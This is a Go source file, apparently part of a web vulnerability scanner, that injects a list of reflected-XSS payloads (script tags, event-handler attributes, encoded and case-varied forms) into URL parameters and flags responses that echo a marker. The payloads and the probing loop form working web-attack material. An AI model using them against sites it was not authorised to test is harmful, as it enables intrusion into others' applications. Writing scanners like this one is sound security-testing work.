package checks

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"

	"whiteclaw/scanner/models"
)

const xssMarker = "wh1t3cl4wXSS"

var xssPayloads = []string{
	`<script>alert('` + xssMarker + `')</script>`,
	`"><script>alert('` + xssMarker + `')</script>`,
	`'><script>alert('` + xssMarker + `')</script>`,
	`</script><script>alert('` + xssMarker + `')</script>`,
	`<img src=x onerror=alert('` + xssMarker + `')>`,
	`"><img src=x onerror=alert('` + xssMarker + `')>`,
	`<img src="x" onerror="alert('` + xssMarker + `')">`,
	`<img/src="x"/onerror=alert('` + xssMarker + `')>`,
	`<img src=x oNeRrOr=alert('` + xssMarker + `')>`,
	`<svg onload=alert('` + xssMarker + `')>`,
	`<svg/onload=alert('` + xssMarker + `')>`,
	`"><svg onload=alert('` + xssMarker + `')>`,
	`<body onload=alert('` + xssMarker + `')>`,
	`<input onfocus=alert('` + xssMarker + `') autofocus>`,
	`<details open ontoggle=alert('` + xssMarker + `')>`,
	`<select onfocus=alert('` + xssMarker + `') autofocus>`,
	`<textarea onfocus=alert('` + xssMarker + `') autofocus>`,
	`<ScRiPt>alert('` + xssMarker + `')</ScRiPt>`,
	`%3Cscript%3Ealert('` + xssMarker + `')%3C%2Fscript%3E`,
	`&#60;script&#62;alert('` + xssMarker + `')&#60;/script&#62;`,
	`"-alert('` + xssMarker + `')-"`,
	`'-alert('` + xssMarker + `')-'`,
	`<div style="width:expression(alert('` + xssMarker + `'))">`,
	`<!--<script>--><script>alert('` + xssMarker + `')</script>`,
	xssMarker,
}

// XSS tests URL parameters for reflected XSS using a concurrent worker pool.
func XSS(client *http.Client, cfg models.ScanConfig) {
	if len(cfg.Params) == 0 {
		models.Status("XSS: no URL parameters found — skipping.")
		return
	}
	models.Status(fmt.Sprintf(
		"Testing reflected XSS (%d payloads × %d params)...",
		len(xssPayloads), len(cfg.Params),
	))

	type job struct{ param, payload string }
	jobs := make([]job, 0, len(cfg.Params)*len(xssPayloads))
	for _, p := range cfg.Params {
		for _, pl := range xssPayloads {
			jobs = append(jobs, job{p, pl})
		}
	}

	sem := newSem(cfg.Workers)
	var wg sync.WaitGroup
	reported := map[string]bool{}
	var mu sync.Mutex

	for _, j := range jobs {
		wg.Add(1)
		j := j
		sem.Acquire()
		go func() {
			defer wg.Done()
			defer sem.Release()

			mu.Lock()
			already := reported[j.param]
			mu.Unlock()
			if already {
				return
			}

			injected := injectParam(cfg.URL, j.param, j.payload)
			req, err := http.NewRequest("GET", injected, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", randomUA())
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			ct := resp.Header.Get("Content-Type")
			if !strings.Contains(strings.ToLower(ct), "html") {
				return
			}

			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			if strings.Contains(string(body), xssMarker) {
				mu.Lock()
				if !reported[j.param] {
					reported[j.param] = true
					mu.Unlock()
					models.Emit(models.Finding{
						Type:     "finding",
						Severity: "HIGH",
						Category: "vulnerabilities",
						Title:    fmt.Sprintf("Reflected XSS in parameter %q", j.param),
						Detail:   fmt.Sprintf("Payload reflected unescaped.\nPayload: %s\nURL: %s", j.payload[:min(len(j.payload), 120)], injected),
						Fix:      "HTML-encode all user input before rendering. Implement a strict Content-Security-Policy.",
					})
				} else {
					mu.Unlock()
				}
			}
		}()
	}
	wg.Wait()
}
